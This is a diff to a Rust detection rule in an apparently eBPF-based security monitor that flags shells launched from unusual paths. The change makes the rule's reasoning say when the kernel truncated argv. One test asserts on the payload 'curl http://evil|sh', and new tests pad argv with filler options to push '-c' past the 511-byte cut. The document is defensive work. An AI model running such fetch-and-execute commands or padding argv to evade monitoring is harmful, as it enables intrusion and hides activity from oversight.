@@ -18,6 +18,10 @@
 //! the tree, as for R001..R003. The allowlist and the trusted-actor record
 //! (PROC-008) are unchanged.
 //!
+//! External audit EBPF-021: the `-c` payload only enriches the reasoning;
+//! when the kernel cut the argv, the reasoning says so (the payload, or
+//! the `-c`, may be past the cut).
+//!
 //! External audit PROC-011 (lab PR 166): the trees only root can write
 //! where a distribution or an administrator installs a shell
 //! (`/usr/local/bin`, `/usr/sbin`, `/sbin`, `/nix/store`) are standard too;
@@ -130,6 +134,9 @@ impl Rule for R017ShellFromNonstandardPath {
         if !parent_comm.is_empty() {
             reasoning = format!("{reasoning}; spawned by {parent_comm}");
         }
+        // External audit EBPF-021: a `-c` payload (or the `-c` itself) past
+        // a cut argv was not seen; the payload shown may be cut too.
+        let reasoning = super::with_argv_cut_note(reasoning, event);
         // External audit PROC-008: and on the program's lineage.
         Some(super::judge_actor(
             &self.allowlist,
@@ -151,7 +158,7 @@ impl Rule for R017ShellFromNonstandardPath {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::decision::rules::testutil::{spawn, spawn_full};
+    use crate::decision::rules::testutil::{argv_cut, spawn, spawn_full};
 
     fn rule() -> R017ShellFromNonstandardPath {
         R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::default()))
@@ -254,6 +261,37 @@ mod tests {
             .reasoning
             .contains("inline command (-c): curl http://evil|sh"));
         assert!(v.reasoning.contains("spawned by sshd"));
+        assert!(!v.reasoning.contains("truncated"), "{}", v.reasoning);
+    }
+
+    /// External audit EBPF-021: `sh` with filler options before `-c`: the
+    /// kernel keeps 511 bytes and the payload (or the `-c`) is past them.
+    /// The verdict is the same; the reasoning names the cut instead of
+    /// showing an argv that looks complete.
+    #[test]
+    fn r017_c_payload_past_the_cut_is_logged() {
+        let mut args = vec!["sh"];
+        args.extend(std::iter::repeat_n("-e", 250));
+        args.push("-c");
+        let ev = argv_cut(spawn_full("sh", "/dev/shm/sh", 1000, &args, "sshd"));
+        let v = rule().evaluate(&ev).expect("fires");
+        assert_eq!(v.action, ResponseAction::KillProcessTree);
+        assert_eq!(v.severity, Severity::High);
+        assert!(v.reasoning.contains("inline -c command"), "{}", v.reasoning);
+        assert!(
+            v.reasoning.contains("argv truncated at 511 bytes"),
+            "{}",
+            v.reasoning
+        );
+        // `-c` itself past the cut.
+        let ev = argv_cut(spawn_full("sh", "/dev/shm/sh", 1000, &args[..200], "sshd"));
+        let v = rule().evaluate(&ev).unwrap();
+        assert!(!v.reasoning.contains("inline"), "{}", v.reasoning);
+        assert!(
+            v.reasoning.contains("arguments past the cut were not seen"),
+            "{}",
+            v.reasoning
+        );
     }
 
     #[test]
